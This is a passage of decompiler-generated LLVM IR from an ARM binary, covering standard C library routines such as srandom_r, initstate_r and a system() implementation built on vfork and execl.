  %v2_13d60 = inttoptr i32 %arg2 to i32*
  store i32 %v0_13d60, i32* %v2_13d60, align 4
  br label %dec_label_pc_13dac

dec_label_pc_13d68:                               ; preds = %entry
  %v2_13d68 = load i32, i32* %arg1, align 4
  store i32 %v2_13d68, i32* %r2.global-to-local, align 4
  %v1_13d6c = add i32 %tmp, 4
  %v2_13d6c = inttoptr i32 %v1_13d6c to i32*
  %v3_13d6c = load i32, i32* %v2_13d6c, align 4
  store i32 %v3_13d6c, i32* %r0.global-to-local, align 4
  %v1_13d70 = inttoptr i32 %v2_13d68 to i32*
  %v2_13d70 = load i32, i32* %v1_13d70, align 4
  store i32 %v2_13d70, i32* %r3.global-to-local, align 4
  %v1_13d74 = inttoptr i32 %v3_13d6c to i32*
  %v2_13d74 = load i32, i32* %v1_13d74, align 4
  %v4_13d74 = add i32 %v3_13d6c, 4
  store i32 %v4_13d74, i32* %r0.global-to-local, align 4
  %v2_13d78 = add i32 %v2_13d74, %v2_13d70
  store i32 %v2_13d78, i32* %r3.global-to-local, align 4
  store i32 %v2_13d78, i32* %v1_13d70, align 4
  %v3_13d7c = load i32, i32* %r2.global-to-local, align 4
  %v4_13d7c = add i32 %v3_13d7c, 4
  store i32 %v4_13d7c, i32* %r2.global-to-local, align 4
  %v0_13d80 = load i32, i32* %ip.global-to-local, align 4
  %v1_13d80 = add i32 %v0_13d80, 24
  %v2_13d80 = inttoptr i32 %v1_13d80 to i32*
  %v3_13d80 = load i32, i32* %v2_13d80, align 4
  store i32 %v3_13d80, i32* %r4.global-to-local, align 4
  %v0_13d84 = load i32, i32* %r3.global-to-local, align 4
  %v3_13d84 = udiv i32 %v0_13d84, 2
  store i32 %v3_13d84, i32* %r3.global-to-local, align 4
  %v3_13d88 = icmp ult i32 %v4_13d7c, %v3_13d80
  %v1_13d8c = load i32, i32* %r5.global-to-local, align 4
  %v2_13d8c = inttoptr i32 %v1_13d8c to i32*
  store i32 %v3_13d84, i32* %v2_13d8c, align 4
  br i1 %v3_13d88, label %dec_label_pc_13d9c, label %bb

bb:                                               ; preds = %dec_label_pc_13d68
  %v1_13d90 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_13d90, i32* %r2.global-to-local, align 4
  %v0_13d94 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13d94, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_13d9c:                               ; preds = %dec_label_pc_13d68
  %v0_13d941 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13d941, i32* %r3.global-to-local, align 4
  %v1_13d9c = load i32, i32* %r4.global-to-local, align 4
  %v3_13d9c = icmp ult i32 %v0_13d941, %v1_13d9c
  br i1 %v3_13d9c, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_13d9c
  store i32 %v0_13d941, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_13d9c
  %v1_13da4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_13da4, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_13da8 = load i32, i32* %ip.global-to-local, align 4
  %v1_13da8 = inttoptr i32 %v0_13da8 to i32*
  %v2_13da8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_13da8, i32* %v1_13da8, align 4
  %v3_13da8 = add i32 %v0_13da8, 4
  %v4_13da8 = inttoptr i32 %v3_13da8 to i32*
  %v5_13da8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_13da8, i32* %v4_13da8, align 4
  br label %dec_label_pc_13dac

dec_label_pc_13dac:                               ; preds = %dec_label_pc_13d44, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_13db0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13db0, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_13d941, { 1, 0, 2 }
  uselistorder i32 %v3_13d84, { 1, 0 }
  uselistorder i32 %v1_13d58, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 11, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder label %dec_label_pc_13dac, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_13db8 = load i32, i32* @r4, align 4
  store i32 %v3_13db8, i32* %stack_var_-32, align 4
  %v6_13db8 = load i32, i32* @r5, align 4
  %v1_13dbc = add i32 %tmp, 12
  %v2_13dbc = inttoptr i32 %v1_13dbc to i32*
  %v3_13dbc = load i32, i32* %v2_13dbc, align 4
  %v2_13dc4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp29 = icmp ugt i32 %v3_13dbc, 4
  br i1 %tmp29, label %.dec_label_pc_13e70_crit_edge, label %dec_label_pc_13dd4

.dec_label_pc_13e70_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_13e70

dec_label_pc_13dd4:                               ; preds = %entry
  %v0_13dd4 = load i32, i32* @r0, align 4
  %v2_13dd4 = icmp eq i32 %v0_13dd4, 0
  %v1_13dd8 = add i32 %tmp, 8
  %v2_13dd8 = inttoptr i32 %v1_13dd8 to i32*
  %v3_13dd8 = load i32, i32* %v2_13dd8, align 4
  store i32 %v3_13dd8, i32* %r7.global-to-local, align 4
  br i1 %v2_13dd4, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_13dd4
  store i32 1, i32* @r0, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_13dd4, %bb
  %v0_13de4 = phi i32 [ %v0_13dd4, %dec_label_pc_13dd4 ], [ 1, %bb ]
  %v2_13de0 = icmp eq i32 %v3_13dbc, 0
  %v2_13de4 = inttoptr i32 %v3_13dd8 to i32*
  store i32 %v0_13de4, i32* %v2_13de4, align 4
  br i1 %v2_13de0, label %dec_label_pc_13e6c, label %dec_label_pc_13dec

dec_label_pc_13dec:                               ; preds = %bb21
  %v1_13dec = add i32 %tmp, 16
  %v2_13dec = inttoptr i32 %v1_13dec to i32*
  %v3_13dec = load i32, i32* %v2_13dec, align 4
  store i32 %v3_13dec, i32* %sb.global-to-local, align 4
  %v0_13df0 = load i32, i32* @r0, align 4
  %v0_13df4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_13df4, i32* %sl.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  %v5_13e3c23 = icmp sgt i32 %v3_13dec, 1
  br i1 %v5_13e3c23, label %dec_label_pc_13e00, label %dec_label_pc_13e40

dec_label_pc_13e00:                               ; preds = %dec_label_pc_13dec, %dec_label_pc_13e00
  %v0_13e1025 = phi i32 [ %v0_13e30.pre, %dec_label_pc_13e00 ], [ %v0_13df0, %dec_label_pc_13dec ]
  %v1_13e2824 = phi i32 [ %v5_13e28, %dec_label_pc_13e00 ], [ %v0_13df4, %dec_label_pc_13dec ]
  %v2_13e00 = srem i32 %v0_13e1025, 127773
  %v2_13e0c = mul i32 %v2_13e00, 16807
  %v2_13e14 = sdiv i32 %v0_13e1025, 127773
  %tmp30 = mul nsw i32 %v2_13e14, -2836
  %v2_13e20 = add i32 %v2_13e0c, %tmp30
  %v8_13e20 = icmp slt i32 %v2_13e20, 0
  %v2_13e24 = add i32 %v2_13e20, 2147483647
  %v2_13e24.v2_13e20 = select i1 %v8_13e20, i32 %v2_13e24, i32 %v2_13e20
  store i32 %v2_13e24.v2_13e20, i32* @r5, align 4
  %v2_13e28 = add i32 %v1_13e2824, 4
  %v3_13e28 = inttoptr i32 %v2_13e28 to i32*
  store i32 %v2_13e24.v2_13e20, i32* %v3_13e28, align 4
  %v4_13e28 = load i32, i32* %sl.global-to-local, align 4
  %v5_13e28 = add i32 %v4_13e28, 4
  store i32 %v5_13e28, i32* %sl.global-to-local, align 4
  %v0_13e2c.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_13e2c.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_13e30.pre = load i32, i32* @r5, align 4
  %v1_13e38 = add i32 %v0_13e2c.pre, 1
  store i32 %v1_13e38, i32* %r8.global-to-local, align 4
  %v5_13e3c = icmp slt i32 %v0_13e2c.pre, %v1_13e2c.pre
  br i1 %v5_13e3c, label %dec_label_pc_13e00, label %dec_label_pc_13e2c.dec_label_pc_13e40_crit_edge

dec_label_pc_13e2c.dec_label_pc_13e40_crit_edge:  ; preds = %dec_label_pc_13e00
  %v0_13e4c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13e40

dec_label_pc_13e40:                               ; preds = %dec_label_pc_13e2c.dec_label_pc_13e40_crit_edge, %dec_label_pc_13dec
  %v0_13e4c = phi i32 [ %v0_13e4c.pre, %dec_label_pc_13e2c.dec_label_pc_13e40_crit_edge ], [ %v0_13df4, %dec_label_pc_13dec ]
  %v0_13e44.lcssa = phi i32 [ %v1_13e2c.pre, %dec_label_pc_13e2c.dec_label_pc_13e40_crit_edge ], [ %v3_13dec, %dec_label_pc_13dec ]
  %v2_13e44 = mul i32 %v0_13e44.lcssa, 10
  store i32 %v2_13e44, i32* @r4, align 4
  %v0_13e48 = load i32, i32* %r6.global-to-local, align 4
  %v1_13e48 = add i32 %v0_13e48, 20
  %v2_13e48 = inttoptr i32 %v1_13e48 to i32*
  %v3_13e48 = load i32, i32* %v2_13e48, align 4
  %v4_13e4c = mul i32 %v3_13e48, 4
  %v5_13e4c = add i32 %v0_13e4c, %v4_13e4c
  %v1_13e50 = inttoptr i32 %v0_13e48 to i32*
  store i32 %v5_13e4c, i32* %v1_13e50, align 4
  %v3_13e50 = add i32 %v0_13e48, 4
  %v4_13e50 = inttoptr i32 %v3_13e50 to i32*
  %v5_13e50 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_13e50, i32* %v4_13e50, align 4
  br label %dec_label_pc_13e5c

dec_label_pc_13e58:                               ; preds = %dec_label_pc_13e5c
  %v0_13e60 = load i32, i32* %r6.global-to-local, align 4
  %v2_13e58 = inttoptr i32 %v0_13e60 to i32*
  %v3_13e58 = call i32 @__GI_random_r(i32* %v2_13e58, i32 %v2_13dc4)
  br label %dec_label_pc_13e5c

dec_label_pc_13e5c:                               ; preds = %dec_label_pc_13e40, %dec_label_pc_13e58
  %v0_13e5c = load i32, i32* @r4, align 4
  %v1_13e5c = add i32 %v0_13e5c, -1
  store i32 %v1_13e5c, i32* @r4, align 4
  %v6_13e5c = icmp slt i32 %v1_13e5c, 0
  br i1 %v6_13e5c, label %dec_label_pc_13e6c, label %dec_label_pc_13e58

dec_label_pc_13e6c:                               ; preds = %dec_label_pc_13e5c, %bb21
  %v2_13e74.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_13e70

dec_label_pc_13e70:                               ; preds = %.dec_label_pc_13e70_crit_edge, %dec_label_pc_13e6c
  %v2_13e74 = phi i32 [ %v3_13db8, %.dec_label_pc_13e70_crit_edge ], [ %v2_13e74.pre, %dec_label_pc_13e6c ]
  %v26_13e74 = phi i32 [ -1, %.dec_label_pc_13e70_crit_edge ], [ 0, %dec_label_pc_13e6c ]
  store i32 %v2_13e74, i32* @r4, align 4
  store i32 %v6_13db8, i32* @r5, align 4
  ret i32 %v26_13e74

; uselistorder directives
  uselistorder i32 %v1_13e5c, { 1, 0 }
  uselistorder i32 %v0_13e48, { 1, 0, 2 }
  uselistorder i32 %v0_13e2c.pre, { 1, 0 }
  uselistorder i32 %v5_13e28, { 1, 0 }
  uselistorder i32 %v2_13e20, { 2, 1, 0 }
  uselistorder i32 %v0_13e1025, { 1, 0 }
  uselistorder i32 %v0_13df4, { 1, 0, 2 }
  uselistorder i32 %v3_13dec, { 1, 0, 2 }
  uselistorder i32 %v3_13dbc, { 1, 0 }
  uselistorder i32 %tmp, { 2, 0, 3, 1 }
  uselistorder i32* %r8.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_13e70, { 1, 0 }
  uselistorder label %dec_label_pc_13e5c, { 1, 0 }
  uselistorder label %dec_label_pc_13e00, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13e78:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_13e78 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13e78, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_13e78
  %v2_13e78 = load i32, i32* @r7, align 4
  %v5_13e78 = udiv i32 %v2_13e78, 8
  %v6_13e78 = and i32 %v5_13e78, %arg1
  store i32 %v6_13e78, i32* %r4.global-to-local, align 4
  %v2_13e7c = load i32, i32* @sp, align 4
  %v8_13e7c = shl i32 %v2_13e7c, %arg3
  %v9_13e7c = and i32 %v8_13e7c, %arg2
  call void @__pseudo_branch(i32 %v9_13e7c)
  %v0_13e80.pr.pr = load i1, i1* @cpsr_z, align 1
  %v1_13e80 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_13e80.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v2_13e80 = load i32, i32* %r4.global-to-local, align 4
  %v3_13e80 = load i32, i32* @fp, align 4
  %v8_13e80 = shl i32 %v2_13e80, %v3_13e80
  %v9_13e80 = and i32 %v8_13e80, %v1_13e80
  store i32 %v9_13e80, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread, %dec_label_pc_13e78, %bb
  %v10_13e80 = phi i32 [ %arg1, %dec_label_pc_13e78 ], [ %v9_13e80, %bb ], [ %v1_13e80, %.thread ]
  ret i32 %v10_13e80

; uselistorder directives
  uselistorder i32 %v1_13e80, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 2, 0, 1 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13e88 = load i32, i32* @r4, align 4
  store i32 %v3_13e88, i32* %stack_var_-20, align 4
  %v6_13e88 = load i32, i32* @r5, align 4
  %v12_13e88 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_13ea8, label %dec_label_pc_13e98

dec_label_pc_13e98:                               ; preds = %entry
  %v2_13e98 = icmp ugt i32 %arg2, 254
  %v7_13e98 = icmp eq i32 %arg2, 255
  %v2_13e9c = xor i1 %v7_13e98, true
  %v3_13e9c = and i1 %v2_13e98, %v2_13e9c
  br i1 %v3_13e9c, label %bb, label %bb20

bb:                                               ; preds = %dec_label_pc_13e98
  store i32 4, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_13e98, %bb
  %v1_13ed07 = phi i32 [ %v3_13e88, %dec_label_pc_13e98 ], [ 4, %bb ]
  %v2_13ea0 = xor i1 %v2_13e98, true
  %v3_13ea0 = or i1 %v7_13e98, %v2_13ea0
  br i1 %v3_13ea0, label %bb21, label %bb25

bb21:                                             ; preds = %bb20
  store i32 3, i32* @r4, align 4
  br label %bb25

dec_label_pc_13ea8:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_13ec0, label %dec_label_pc_13eb0

dec_label_pc_13eb0:                               ; preds = %dec_label_pc_13ea8
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_13f2c

.thread10:                                        ; preds = %dec_label_pc_13eb0
  store i32 0, i32* @r4, align 4
  br label %bb25

dec_label_pc_13ec0:                               ; preds = %dec_label_pc_13ea8
  %v2_13ec0 = icmp ugt i32 %arg2, 62
  %v7_13ec0 = icmp eq i32 %arg2, 63
  %v2_13ec4 = xor i1 %v7_13ec0, true
  %v3_13ec4 = and i1 %v2_13ec0, %v2_13ec4
  br i1 %v3_13ec4, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_13ec0
  store i32 2, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_13ec0, %bb22
  %v1_13ed06 = phi i32 [ %v3_13e88, %dec_label_pc_13ec0 ], [ 2, %bb22 ]
  %v2_13ec8 = xor i1 %v2_13ec0, true
  %v3_13ec8 = or i1 %v7_13ec0, %v2_13ec8
  br i1 %v3_13ec8, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  store i32 1, i32* @r4, align 4
  br label %bb25

bb25:                                             ; preds = %.thread10, %bb21, %bb20, %bb23, %bb24
  %v1_13ed8 = phi i32 [ 3, %bb21 ], [ %v1_13ed07, %bb20 ], [ %v1_13ed06, %bb23 ], [ 1, %bb24 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_1d62c.741 to i32), i32* %r2.global-to-local, align 4
  %v4_13ed0 = mul i32 %v1_13ed8, 4
  %v5_13ed0 = add i32 %v4_13ed0, ptrtoint (i32* @global_var_1d62c.741 to i32)
  store i32 %v5_13ed0, i32* %r3.global-to-local, align 4
  %v1_13ed4 = add i32 %v4_13ed0, add (i32 ptrtoint (i32* @global_var_1d62c.741 to i32), i32 20)
  %v2_13ed4 = inttoptr i32 %v1_13ed4 to i32*
  %v3_13ed4 = load i32, i32* %v2_13ed4, align 4
  store i32 %v3_13ed4, i32* %r1.global-to-local, align 4
  %v6_13ed8 = inttoptr i32 %v5_13ed0 to i32*
  %v7_13ed8 = load i32, i32* %v6_13ed8, align 4
  store i32 %v7_13ed8, i32* %r2.global-to-local, align 4
  %v1_13edc = add i32 %tmp, 4
  store i32 %v1_13edc, i32* @r6, align 4
  %v4_13ee0 = mul i32 %v3_13ed4, 4
  %v5_13ee0 = add i32 %v4_13ee0, %v1_13edc
  store i32 %v5_13ee0, i32* %r3.global-to-local, align 4
  %v2_13ee4 = add i32 %arg3, 24
  %v3_13ee4 = inttoptr i32 %v2_13ee4 to i32*
  store i32 %v5_13ee0, i32* %v3_13ee4, align 4
  %v0_13ee8 = load i32, i32* %r2.global-to-local, align 4
  %v1_13ee8 = load i32, i32* @r5, align 4
  %v2_13ee8 = add i32 %v1_13ee8, 20
  %v3_13ee8 = inttoptr i32 %v2_13ee8 to i32*
  store i32 %v0_13ee8, i32* %v3_13ee8, align 4
  %v0_13eec = load i32, i32* %r1.global-to-local, align 4
  %v1_13eec = load i32, i32* @r5, align 4
  %v2_13eec = add i32 %v1_13eec, 16
  %v3_13eec = inttoptr i32 %v2_13eec to i32*
  store i32 %v0_13eec, i32* %v3_13eec, align 4
  %v0_13ef0 = load i32, i32* @r4, align 4
  %v1_13ef0 = load i32, i32* @r5, align 4
  %v2_13ef0 = add i32 %v1_13ef0, 12
  %v3_13ef0 = inttoptr i32 %v2_13ef0 to i32*
  store i32 %v0_13ef0, i32* %v3_13ef0, align 4
  %v0_13ef4 = load i32, i32* @r6, align 4
  %v1_13ef4 = load i32, i32* @r5, align 4
  %v2_13ef4 = add i32 %v1_13ef4, 8
  %v3_13ef4 = inttoptr i32 %v2_13ef4 to i32*
  store i32 %v0_13ef4, i32* %v3_13ef4, align 4
  %v0_13ef8 = load i32, i32* @r5, align 4
  store i32 %v0_13ef8, i32* %r1.global-to-local, align 4
  %v0_13efc = load i32, i32* @r0, align 4
  %v2_13efc = inttoptr i32 %v0_13efc to i32*
  %v3_13efc = call i32 @srandom_r(i32* %v2_13efc, i32 %v0_13ef8)
  store i32 %v3_13efc, i32* %r0.global-to-local, align 4
  %v0_13f00 = load i32, i32* @r4, align 4
  %v2_13f00 = icmp eq i32 %v0_13f00, 0
  br i1 %v2_13f00, label %bb26, label %.thread4

bb26:                                             ; preds = %bb25
  %v1_13f1c12 = load i32, i32* @r7, align 4
  %v2_13f1c13 = inttoptr i32 %v1_13f1c12 to i32*
  store i32 0, i32* %v2_13f1c13, align 4
  %v1_13f20 = load i32, i32* @r4, align 4
  store i32 %v1_13f20, i32* %r0.global-to-local, align 4
  br label %bb27

.thread4:                                         ; preds = %bb25
  %v1_13f04 = load i32, i32* @r5, align 4
  %v2_13f04 = add i32 %v1_13f04, 4
  %v3_13f04 = inttoptr i32 %v2_13f04 to i32*
  %v4_13f04 = load i32, i32* %v3_13f04, align 4
  %v1_13f08 = load i32, i32* @r6, align 4
  %v3_13f08 = sub i32 %v4_13f04, %v1_13f08
  %v4_13f0c = sdiv i32 %v3_13f08, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_13f14 = mul i32 %v4_13f0c, 5
  %v5_13f14 = add i32 %v4_13f14, %v0_13f00
  store i32 %v5_13f14, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13f1c = load i32, i32* @r7, align 4
  %v2_13f1c = inttoptr i32 %v1_13f1c to i32*
  store i32 0, i32* %v2_13f1c, align 4
  %v1_13f24 = load i32, i32* %r3.global-to-local, align 4
  %v2_13f24 = load i32, i32* @r7, align 4
  %v3_13f24 = inttoptr i32 %v2_13f24 to i32*
  store i32 %v1_13f24, i32* %v3_13f24, align 4
  %v17_13f28.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb27

bb27:                                             ; preds = %bb26, %.thread4
  %v17_13f28 = phi i32 [ %v1_13f20, %bb26 ], [ %v17_13f28.pre, %.thread4 ]
  %v2_13f28 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13f28, i32* @r4, align 4
  store i32 %v6_13e88, i32* @r5, align 4
  store i32 %v12_13e88, i32* @r7, align 4
  ret i32 %v17_13f28

dec_label_pc_13f2c:                               ; preds = %dec_label_pc_13eb0
  %v0_13f2c = call i32 @__errno_location()
  store i32 %v0_13f2c, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_13f34 = inttoptr i32 %v0_13f2c to i32*
  store i32 22, i32* %v2_13f34, align 4
  %v0_13f38 = call i32 @__errno_location()
  %v0_13f3c = load i32, i32* %r4.global-to-local, align 4
  %v2_13f3c = inttoptr i32 %v0_13f38 to i32*
  store i32 %v0_13f3c, i32* %v2_13f3c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13f44 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13f44, i32* @r4, align 4
  store i32 %v6_13e88, i32* @r5, align 4
  store i32 %v12_13e88, i32* @r7, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_13ec0, { 1, 0 }
  uselistorder i1 %v7_13e98, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_1d62c.741 to i32), i32 20), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1d62c.741 to i32), { 2, 3, 1, 0 }
  uselistorder i32 63, { 1, 0 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb25, { 4, 3, 0, 1, 2 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_13f50 = load i32, i32* %r0.global-to-local, align 4
  %v2_13f50 = icmp eq i32 %v0_13f50, 0
  br i1 %v2_13f50, label %bb, label %dec_label_pc_13f64

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14070

dec_label_pc_13f64:                               ; preds = %entry
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_13f6c = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_13f7c = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_13f8c = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_13f8c, i32* %r0.global-to-local, align 4
  %v1_13f94 = call i32 @__vfork(i32 %v2_13f8c)
  store i32 %v1_13f94, i32* %r0.global-to-local, align 4
  store i32 %v1_13f94, i32* @r4, align 4
  %v1_13f98 = icmp slt i32 %v1_13f94, 0
  br i1 %v1_13f98, label %dec_label_pc_13fa0, label %dec_label_pc_13fcc

dec_label_pc_13fa0:                               ; preds = %dec_label_pc_13f64
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_13fa8 = call i32 @__bsd_signal(i32 3, i32 %v2_13f6c)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_13fb4 = call i32 @__bsd_signal(i32 2, i32 %v2_13f7c)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_13fc0 = call i32 @__bsd_signal(i32 17, i32 %v2_13f8c)
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14070

dec_label_pc_13fcc:                               ; preds = %dec_label_pc_13f64
  %v2_13f98 = icmp eq i32 %v1_13f94, 0
  br i1 %v2_13f98, label %dec_label_pc_13fd0, label %dec_label_pc_14014

dec_label_pc_13fd0:                               ; preds = %dec_label_pc_13fcc
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_13fd8 = call i32 @__bsd_signal(i32 3, i32 0)
  %v0_13fdc = load i32, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_13fe4 = call i32 @__bsd_signal(i32 2, i32 %v0_13fdc)
  %v0_13fe8 = load i32, i32* @r4, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_13ff0 = call i32 @__bsd_signal(i32 17, i32 %v0_13fe8)
  store i32 ptrtoint ([8 x i8]* @global_var_1d654.748 to i32), i32* @r0, align 4
  %v0_14004 = load i32, i32* @r4, align 4
  %v8_14008 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1d654.748 to i32), i32 ptrtoint ([3 x i8]* @global_var_1d65c.750 to i32), i32 ptrtoint ([3 x i8]* @global_var_1d660.752 to i32), i32 %v0_13f50, i32 %v0_14004)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_14010 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_14014:                               ; preds = %dec_label_pc_13fcc
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_1401c = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_14028 = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_14038 = load i32, i32* @r4, align 4
  store i32 %v0_14038, i32* %r0.global-to-local, align 4
  %v0_1403c = call i32 @wait4()
  store i32 %v0_1403c, i32* %r0.global-to-local, align 4
  %v7_14040 = icmp eq i32 %v0_1403c, -1
  br i1 %v7_14040, label %bb10, label %bb11

bb10:                                             ; preds = %dec_label_pc_14014
  store i32 %v0_1403c, i32* %stack_var_-12, align 4
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_14014, %bb10
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_14050 = call i32 @__bsd_signal(i32 3, i32 %v2_13f6c)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_1405c = call i32 @__bsd_signal(i32 2, i32 %v2_13f7c)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_14068 = call i32 @__bsd_signal(i32 17, i32 %v2_13f8c)
  %v3_1406c = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_1406c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14070

dec_label_pc_14070:                               ; preds = %bb, %dec_label_pc_13fa0, %bb11
  %v8_14074 = phi i32 [ 1, %bb ], [ -1, %dec_label_pc_13fa0 ], [ %v3_1406c, %bb11 ]
  ret i32 %v8_14074

; uselistorder directives
  uselistorder i32 %v0_1403c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 20, 19, 21, 22, 23, 0, 1 }
  uselistorder i32 ()* @wait4, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_14070, { 2, 1, 0 }
